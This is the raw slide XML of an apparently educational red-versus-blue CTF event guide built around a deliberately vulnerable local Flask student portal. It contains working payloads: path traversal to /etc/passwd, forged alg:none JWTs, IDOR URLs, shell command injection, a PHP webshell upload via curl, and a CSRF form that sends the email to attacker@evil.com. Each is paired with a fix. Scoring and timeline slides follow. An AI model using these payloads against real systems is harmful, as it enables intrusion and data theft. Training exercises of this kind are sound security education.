            <a:ext cx="45720" cy="89611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9472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'http://localhost:5000/resources/download?file=../../etc/passwd'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'http://localhost:5000/resources/download?file=../../data/db_backup_jan2024.sql'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28032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919472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filename = os.path.basename(request.args.get('file',''))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filepath = os.path.join('static/files', filename)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os.path.basename() strips all path traversal.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//  VULNERABILITY DOSSIER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2608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91256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9544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VT{s3nsitive_data_3xpos3d}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92608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Sensitive Data Exposure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EASY · +10 pts · GET /robots.txt  ·  GET /.env  ·  HTML source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robots.txt contains dev comments, /.env is web-accessible, HTML has inline credential comments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914400"/>
            <a:ext cx="45720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Developer left credentials in robots.txt comments. .env file serves plaintext via Flask route. base.html has &lt;!-- secret_key --&gt; in source.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914400"/>
            <a:ext cx="45720" cy="8961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http://localhost:5000/robots.txt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http://localhost:5000/.env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Ctrl+U on any page → check HTML &lt;!-- comments --&gt;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048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ALL credentials from robots.txt.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 /.env:  location /.env { deny all; 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 &lt;!-- --&gt; comment blocks from all HTML templates.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28032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VT{jwt_alg_n0ne_forg3d}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828032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0096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JWT alg:none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INTERMEDIATE · +20 pts · POST /api/token  →  GET /api/me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9472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API authentication — decode_jwt() accepts unsigned tokens silently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28032" y="914400"/>
            <a:ext cx="45720" cy="6583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19472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decode_jwt() checks if header['alg'].lower() == 'none' and skips signature verification. Attacker forges any identity by crafting a header.payload. (empty sig).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28032" y="914400"/>
            <a:ext cx="45720" cy="89611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9472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POST /api/token  {roll_no: VTU2021001, password: arjun123}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Forge:  header={alg:none}  payload={student_id:1,role:admin}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Token: eyJhbGciOiJub25lIn0.eyJzdHVkZW50X2lkIjoxLCJyb2xlIjoiYWRtaW4ifQ.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28032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919472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early rejection in decode_jwt():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header.get('alg','').lower() == 'none':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   # reject — never skip verification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//  VULNERABILITY DOSSIER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2608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91256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9544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VT{id0r_r3sult_l3ak}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92608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IDOR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INTERMEDIATE · +20 pts · GET /api/result/&lt;id&gt;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Result records API — no ownership check on record retrieval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914400"/>
            <a:ext cx="45720" cy="65836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Query: SELECT * FROM results WHERE id=? — no check that id belongs to the requesting student. Any ID 1-6 returns any student's academic record.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FFB800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914400"/>
            <a:ext cx="45720" cy="89611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http://localhost:5000/api/result/1   ← another student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http://localhost:5000/api/result/3   ← Priya's marks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http://localhost:5000/api/result/5   ← Sneha's record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048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ownership check to query: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id=? AND student_id=session['user']['id']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403 Forbidden if student_id does not match.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28032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VT{cmd_inj3ction_nsl00kup}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828032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0096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Command Injection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INTERMEDIATE · +20 pts · POST /tools/nslookup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9472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IT Tools page — DNS lookup passes user input to OS shell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28032" y="914400"/>
            <a:ext cx="45720" cy="65836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19472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subprocess.check_output(f'nslookup {domain}', shell=True) — shell=True means semicolons split into separate commands. Full RCE with root permissions.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28032" y="914400"/>
            <a:ext cx="45720" cy="896112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9D4E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9472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domain field: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vidyatech.edu; whoami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vidyatech.edu; cat /etc/passwd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vidyatech.edu; cat /app/data/vidyatech.db | base64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28032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919472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list argument — never shell=True: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subprocess.run(['nslookup', domain], shell=False, timeout=5)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validate: re.match(r'^[a-zA-Z0-9.-]+$', domain)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//  VULNERABILITY DOSSIER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92608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91256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9544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VT{f1le_upl0ad_websh3ll}</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="650" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="8" name="Shape 6"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="292608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#9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4672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Insecure File Upload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04672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INTERMEDIATE · +20 pts · POST /assignments/upload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84048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Assignment submission — weak extension filtering allows PHP execution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914400"/>
            <a:ext cx="45720" cy="658368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4048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Server only checks if fname.lower().endswith('.php'). Files go to static/uploads/ which is web-accessible. .php5/.phtml/.phar bypass the check.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92608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914400"/>
            <a:ext cx="45720" cy="89611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84048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'&lt;?php system($_GET["cmd"]); ?&gt;' &gt; shell.php5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-F 'subject=CS&amp;file=@shell.php5;type=image/jpeg' http://localhost:5000/assignments/upload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'http://localhost:5000/static/uploads/shell.php5?cmd=whoami'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2608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84048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ALLOWED = {'.pdf','.docx','.pptx','.jpg','.png'}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any(fname.endswith(e) for e in ALLOWED): abort(400)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Also: validate MIME type with python-magic library.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828032" y="457200"/>
            <a:ext cx="4315968" cy="502920"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst>
              <a:gd name="adj" fmla="val 727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26680" y="502920"/>
            <a:ext cx="1325880" cy="228600"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst>
              <a:gd name="adj" fmla="val 8000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44968" y="512064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VT{csrf_3mail_hij4ck}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828032" y="457200"/>
            <a:ext cx="438912" cy="502920"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst>
              <a:gd name="adj" fmla="val 4167"/>
            </a:avLst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4572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40096" y="49377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CSRF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0096" y="731520"/>
            <a:ext cx="3721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1117"/>
                </a:solidFill>
              </a:rPr>
              <a:t>INTERMEDIATE · +20 pts · POST /account/update-email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1005840"/>
            <a:ext cx="4315968" cy="502920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28032" y="914400"/>
            <a:ext cx="45720" cy="5029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9472" y="104241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19472" y="1207008"/>
            <a:ext cx="4151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Account settings form — email update has no CSRF token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28032" y="1536192"/>
            <a:ext cx="4315968" cy="658368"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="21262D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28032" y="914400"/>
            <a:ext cx="45720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9472" y="15727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919472" y="1737360"/>
            <a:ext cx="4151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The form POSTs with no CSRF token. Any third-party website can trigger this request cross-origin if the victim is currently authenticated.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28032" y="2221992"/>
            <a:ext cx="4315968" cy="896112"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="0D1117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28032" y="914400"/>
            <a:ext cx="45720" cy="89611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19472" y="225856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919472" y="2423160"/>
            <a:ext cx="4151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&lt;html&gt;&lt;body onload="document.forms[0].submit()"&gt;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&lt;form action="http://TARGET/account/update-email" method="POST"&gt;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&lt;input name="email" value="attacker@evil.com"&gt;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&lt;/form&gt;&lt;/body&gt;&lt;/html&gt;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3145536"/>
            <a:ext cx="4315968" cy="713232"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="001A00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28032" y="914400"/>
            <a:ext cx="45720" cy="713232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9472" y="318211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919472" y="3346704"/>
            <a:ext cx="4151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flask-wtf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flask_wtf.csrf import CSRFProtect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csrf = CSRFProtect(app)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{{ form.hidden_tag() }} inside every POST form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4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//  SCORING &amp; WIN CONDITIONS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System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4069080" cy="3886200"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="161B22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05840"/>
            <a:ext cx="4069080" cy="402336"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="8B1A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005840"/>
            <a:ext cx="406908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04241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 TEAM  //  SCORING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1463040"/>
            <a:ext cx="4014216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48132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05840" y="157276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4813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Exploit any easy vulnerability (#1–5)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1965960"/>
            <a:ext cx="4014216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98424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05840" y="207568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78992" y="19842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Exploit any intermediate vulnerability (#6–10)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2468880"/>
            <a:ext cx="4014216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48716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+30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05840" y="257860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8992" y="24871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Achieve RCE — webshell or command injection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2971800"/>
            <a:ext cx="4014216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299008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05840" y="308152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2990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Exfiltrate the SQLite database file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474720"/>
            <a:ext cx="4014216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49300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005840" y="358444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34930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Bypass a Blue Team patch after it is applied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" y="3977640"/>
            <a:ext cx="4014216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4048" y="399592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840" y="408736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78992" y="39959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Escalate to admin via any method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7472" y="4480560"/>
            <a:ext cx="4014216" cy="347472"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="8B1A1A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480560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MAXIMUM: 150+ PTS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1005840"/>
            <a:ext cx="4069080" cy="3886200"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="161B22"/>
          </a:solidFill>
          <a:ln w="9525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1005840"/>
            <a:ext cx="4069080" cy="402336"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="1A3F6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005840"/>
            <a:ext cx="406908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1042416"/>
            <a:ext cx="3858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TEAM  //  SCORING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82312" y="1463040"/>
            <a:ext cx="4014216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18888" y="148132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+25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40680" y="157276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14813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Patch a vulnerability before it is exploited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782312" y="1965960"/>
            <a:ext cx="4014216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198424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440680" y="207568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19842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Detect an active attack in real-time with proof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82312" y="2468880"/>
            <a:ext cx="4014216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18888" y="248716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440680" y="257860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248716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Block attacker tool via rate limit or WAF rule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782312" y="2971800"/>
            <a:ext cx="4014216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18888" y="299008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440680" y="308152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3832" y="299008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Restore service after a successful attack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782312" y="3474720"/>
            <a:ext cx="4014216" cy="457200"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="21262D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18888" y="349300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5440680" y="358444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13832" y="349300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Submit a detailed written incident report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782312" y="3977640"/>
            <a:ext cx="4014216" cy="4572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18888" y="3995928"/>
            <a:ext cx="594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+15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5440680" y="4087368"/>
            <a:ext cx="18288" cy="27432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513832" y="399592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D1D9"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Detect and document all 5 easy vulnerabilities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782312" y="4480560"/>
            <a:ext cx="4014216" cy="347472"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="1A3F6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82312" y="4480560"/>
            <a:ext cx="4014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MAXIMUM: 150+ PTS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2A5F9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TIMELINE &amp; RULES OF ENGAGEMENT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90-Minute Operation Structure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011680" cy="3547872"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="161B22"/>
          </a:solidFill>
          <a:ln w="9525">
            <a:solidFill>
              <a:srgbClr val="2A5F9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2011680" cy="36576"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/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60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0:00–0:10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5F9F"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Phase I — Setup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18288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1737360"/>
            <a:ext cx="54864" cy="475488"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/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3736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Distribute access credentials to both teams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" y="2395728"/>
            <a:ext cx="54864" cy="475488"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/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957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Power on VMs, share target URL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" y="3054096"/>
            <a:ext cx="54864" cy="475488"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/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54096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Instructor reads rules aloud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" y="3712464"/>
            <a:ext cx="54864" cy="475488"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="2A5F9F"/>
          </a:solidFill>
          <a:ln w="12700">
            <a:solidFill>
              <a:srgbClr val="2A5F9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12464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No offensive actions yet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96312" y="1005840"/>
            <a:ext cx="2011680" cy="3547872"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="161B22"/>
          </a:solidFill>
          <a:ln w="9525">
            <a:solidFill>
              <a:srgbClr val="9D4ED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496312" y="1005840"/>
            <a:ext cx="2011680" cy="36576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87752" y="1060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0:10–0:20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87752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D4EDD"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Phase II — Recon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87752" y="1627632"/>
            <a:ext cx="18288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06040" y="1737360"/>
            <a:ext cx="54864" cy="47548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24912" y="173736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Red: map the site, check robots.txt &amp; /.env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06040" y="2395728"/>
            <a:ext cx="54864" cy="47548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24912" y="23957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Blue: open monitor at :8080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06040" y="3054096"/>
            <a:ext cx="54864" cy="47548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24912" y="3054096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Blue: read source, plan patches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3712464"/>
            <a:ext cx="54864" cy="475488"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="9D4EDD"/>
          </a:solidFill>
          <a:ln w="12700">
            <a:solidFill>
              <a:srgbClr val="9D4E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24912" y="3712464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Both: identify attack surface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26864" y="1005840"/>
            <a:ext cx="2011680" cy="3547872"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="161B22"/>
          </a:solidFill>
          <a:ln w="9525">
            <a:solidFill>
              <a:srgbClr val="E74C3C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26864" y="1005840"/>
            <a:ext cx="201168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1060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0:20–1:20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18304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Phase III — Live Battle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18304" y="1627632"/>
            <a:ext cx="18288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1737360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173736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Red: exploit vulnerabilities in sequence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36592" y="2395728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23957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Blue: detect and patch in real-time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36592" y="3054096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55464" y="3054096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Judges: verify exploits &amp; award points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36592" y="3712464"/>
            <a:ext cx="54864" cy="4754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55464" y="3712464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Timer displayed on projector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757416" y="1005840"/>
            <a:ext cx="2011680" cy="3547872"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="161B22"/>
          </a:solidFill>
          <a:ln w="9525">
            <a:solidFill>
              <a:srgbClr val="00C469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757416" y="1005840"/>
            <a:ext cx="2011680" cy="36576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48856" y="1060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1:20–1:30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848856" y="12618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69"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Phase IV — Debrief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48856" y="1627632"/>
            <a:ext cx="1828800" cy="1828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67144" y="1737360"/>
            <a:ext cx="54864" cy="475488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86016" y="1737360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Instructor reveals all vulnerabilities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67144" y="2395728"/>
            <a:ext cx="54864" cy="475488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86016" y="2395728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Red Team demos each exploit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867144" y="3054096"/>
            <a:ext cx="54864" cy="475488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986016" y="3054096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Blue Team presents incident report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67144" y="3712464"/>
            <a:ext cx="54864" cy="475488"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="00C469"/>
          </a:solidFill>
          <a:ln w="12700">
            <a:solidFill>
              <a:srgbClr val="00C46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86016" y="3712464"/>
            <a:ext cx="1719072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9D1D9"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Scores tallied — winner announced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4681728"/>
            <a:ext cx="8412480" cy="310896"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst>
              <a:gd name="adj" fmla="val 8824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2920" y="47000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 OF ENGAGEMENT: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148840" y="4700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▸ Attack only the target host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465576" y="4700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▸ No denial-of-service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82312" y="4700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▸ All flags must be verified by judge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099048" y="4700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▸ Blue Team cannot view Red Team's terminal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15784" y="470001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9D1D9"/>
                </a:solidFill>
              </a:rPr>
              <a:t>▸ Judge decision is final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0" y="5001768"/>
            <a:ext cx="8961120" cy="141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THE NEXUS PROTOCOL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6576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914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1828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743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657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572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5486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6400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7315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8229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9144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0" y="10058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10972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0" y="11887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12801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0" y="13716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14630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5544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6459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17373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8288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9202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0116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031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1945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22860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23774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4688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603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26517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27432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28346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29260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30175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31089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32004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32918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33832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0" y="34747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0" y="35661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0" y="36576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37490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0" y="38404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0" y="39319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0" y="40233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0" y="41148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0" y="42062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0" y="42976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0" y="43891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0" y="44805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0" y="45720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0" y="466344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0" y="475488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0" y="484632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493776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0" y="5029200"/>
            <a:ext cx="9144000" cy="3200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14400" y="731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OPERATION INITIATED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914400" y="10515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the best team</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="4400" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="63" name="Text 61"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="914400" y="16916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WIN.</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="7200" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="64" name="Shape 62"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="3200400" y="2578608"/>
            <a:ext cx="1371600" cy="3657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17720" y="2578608"/>
            <a:ext cx="1371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97280" y="2761488"/>
            <a:ext cx="37490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1225296" y="2816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SITE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1225296" y="3017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120640" y="2761488"/>
            <a:ext cx="37490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5248656" y="281635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BLUE MONITOR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5248656" y="30175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1097280" y="3383280"/>
            <a:ext cx="37490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1225296" y="3438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 PAGE</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="750" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="74" name="Text 72"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1225296" y="36393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http://localhost:5000/instructor/hints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120640" y="3383280"/>
            <a:ext cx="37490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5248656" y="3438144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BRIEFING PIN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5248656" y="36393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VT@CTF2024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097280" y="4005072"/>
            <a:ext cx="37490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1225296" y="4059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COMMAND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225296" y="4261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app.py  OR  ./ctf.sh start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5120640" y="4005072"/>
            <a:ext cx="3749040" cy="530352"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/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248656" y="4059936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 OPERATION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5248656" y="4261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./ctf.sh reset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457200" y="4983480"/>
            <a:ext cx="822960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03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NEXUS PROTOCOL  ·  RED TEAM VS BLUE TEAM  ·  CYBERSECURITY ATTACK &amp; DEFENSE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Nexus Protocol — Red Team vs Blue Team Event Guide</dc:title>
  <dc:subject>Cybersecurity Attack &amp; Defense Competition</dc:subject>
  <dc:creator>The Nexus Protocol</dc:creator>
  <cp:lastModifiedBy>The Nexus Protocol</cp:lastModifiedBy>
  <cp:revision>1</cp:revision>
  <dcterms:created xsi:type="dcterms:W3CDTF">2026-03-17T17:05:32Z</dcterms:created>
  <dcterms:modified xsi:type="dcterms:W3CDTF">2026-03-17T17:05:32Z</dcterms:modified>
</cp:coreProperties>
</file>